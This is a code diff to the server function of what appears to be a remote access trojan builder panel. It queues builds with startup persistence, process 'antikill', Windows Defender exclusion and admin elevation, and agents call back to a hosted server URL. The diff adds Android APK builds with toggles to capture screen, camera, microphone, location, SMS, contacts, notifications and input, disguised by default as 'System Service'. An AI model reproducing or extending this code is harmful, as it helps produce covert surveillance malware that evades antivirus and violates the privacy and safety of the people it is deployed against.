@@ -13,12 +13,23 @@ const Input = z.object({
   require_admin: z.boolean().optional().default(false),
   fun_features: z.boolean().optional().default(false),
   tag: z.string().max(32).regex(/^[a-zA-Z0-9 _-]*$/).optional().nullable(),
-  output_kind: z.enum(["exe", "bat"]),
+  output_kind: z.enum(["exe", "bat", "apk"]),
   icon_url: z.string().url().optional().nullable(),
+  platform: z.enum(["windows", "android"]).default("windows"),
+  android_features: z.object({
+    screen: z.boolean(),
+    camera: z.boolean(),
+    files: z.boolean(),
+    mic: z.boolean(),
+    location: z.boolean(),
+    sms: z.boolean(),
+    contacts: z.boolean(),
+    notifications: z.boolean(),
+    input: z.boolean(),
+  }).optional().nullable(),
+  app_display_name: z.string().max(60).optional().nullable(),
 });
 
-// Stable lovable.app URLs that actually serve our API (lovableproject.com
-// preview URLs redirect and break the agent's JSON parsing).
 const PROJECT_ID = "5a812085-735a-438c-8ab0-793e6374dce4";
 const STABLE_PROD = `https://project--${PROJECT_ID}.lovable.app`;
 const STABLE_DEV = `https://project--${PROJECT_ID}-dev.lovable.app`;
@@ -49,13 +60,11 @@ function detectOrigin(): string {
 
   for (const raw of candidates) {
     const u = raw.replace(/\/$/, "");
-    // Skip iframe preview origins — they redirect and break agents.
     if (/lovableproject\.com$/i.test(new URL(u).hostname)) continue;
     if (/^id-preview--/i.test(new URL(u).hostname)) continue;
     if (/lovable\.app$/i.test(new URL(u).hostname)) return normalizeAgentTarget(u);
   }
 
-  // Fall back to a known-good stable URL.
   return STABLE_DEV;
 }
 
@@ -76,24 +85,35 @@ export const createBuild = createServerFn({ method: "POST" })
 
     const targetServerUrl = detectOrigin();
 
+    const insertData: any = {
+      user_id: userId,
+      name: data.name,
+      startup: data.startup,
+      startup_name: data.startup ? (data.startup_name || data.name) : null,
+      debug: data.debug,
+      antikill: data.antikill ?? false,
+      wd_exclusion: data.wd_exclusion ?? false,
+      require_admin: data.require_admin ?? false,
+      fun_features: data.fun_features ?? false,
+      tag: data.tag ?? null,
+      output_kind: data.output_kind,
+      icon_url: data.icon_url ?? null,
+      status: "queued",
+      target_server_url: targetServerUrl,
+      platform: data.platform,
+    };
+
+    // Store android features in the features JSONB column
+    if (data.platform === "android" && data.android_features) {
+      insertData.features = {
+        ...data.android_features,
+        app_display_name: data.app_display_name || "System Service",
+      };
+    }
+
     const { data: row, error } = await supabase
       .from("builds")
-      .insert({
-        user_id: userId,
-        name: data.name,
-        startup: data.startup,
-        startup_name: data.startup ? (data.startup_name || data.name) : null,
-        debug: data.debug,
-        antikill: data.antikill ?? false,
-        wd_exclusion: data.wd_exclusion ?? false,
-        require_admin: data.require_admin ?? false,
-        fun_features: data.fun_features ?? false,
-        tag: data.tag ?? null,
-        output_kind: data.output_kind,
-        icon_url: data.icon_url ?? null,
-        status: "queued",
-        target_server_url: targetServerUrl,
-      } as any)
+      .insert(insertData)
       .select("id")
       .single();
     if (error) return { ok: false as const, error: error.message };
